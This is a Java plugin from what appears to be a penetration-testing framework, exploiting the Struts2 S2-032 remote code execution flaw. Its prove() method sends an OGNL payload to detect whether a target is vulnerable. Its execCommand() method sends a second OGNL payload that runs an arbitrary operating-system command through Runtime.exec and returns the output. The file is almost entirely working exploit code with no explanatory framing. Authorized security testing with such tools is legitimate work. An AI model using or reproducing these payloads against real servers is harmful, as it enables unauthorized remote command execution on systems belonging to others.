package com.orleven.tentacle.permeate.script;

import org.apache.catalina.util.URLEncoder;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;
import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.define.Message;
import com.orleven.tentacle.define.Permeate;
import com.orleven.tentacle.permeate.bean.ProveBean;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;
import com.orleven.tentacle.util.WebUtil;

/**
 * Struts2 RCE 032
 * @author orleven
 * @date 2017年3月19日
 */
@Component
@Scope("prototype")
public class Struts2RCE032 extends WebScriptBase{
	
	public Struts2RCE032(){
		super();
	}
	
	@Override
	public void prove() {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String provePayload1 = new URLEncoder().encode("method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close","UTF-8");
		String provePayload2 = "&tag=The Struts2-032 Remote Code Execution Is Exist!";
		String proveFlag1 = "The Struts2-032 Remote Code Execution Is Exist!";
		String proveFlag2 = "tag=The Struts2-032 Remote Code Execution Is Exist!";
		String result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),provePayload1+provePayload2));
		if (result==null) {
			result = Message.notAvailable;
			getVulnerBean().setIsVulner(Permeate.isNotVerified);
		}else if(result.indexOf(proveFlag1)>=0&&result.indexOf(proveFlag2)<0){
			getVulnerBean().setIsVulner(Permeate.isVulner);
		}
		else{
			getVulnerBean().setIsVulner(Permeate.isNotVulner);
		}
		proveBean.setReceiveMessage(result);
		proveBean.setSendMessage(provePayload1+provePayload2);
		getVulnerBean().getProveBean().add(proveBean);
		
	}
	
	@Override
	public void execCommand(String command) {
		String execPayload1 = new URLEncoder().encode("method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.println(#parameters.tags[0]),#w.print(#str),#w.print(#parameters.tags[0]),#w.close(),1?#xx:#request.toString","UTF-8");
		String execPayload2 = "&cmd=";
		String execPayload3 = "&pp=\\AAAA&ppp=%20&encoding=UTF-8&tags=----- The Struts2-032 Remote Code Execution -----";
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),execPayload1+execPayload2+command +execPayload3));
		proveBean.setReceiveMessage(result);
		proveBean.setSendMessage(command);
		getVulnerBean().getProveBean().add(proveBean);
	}
}
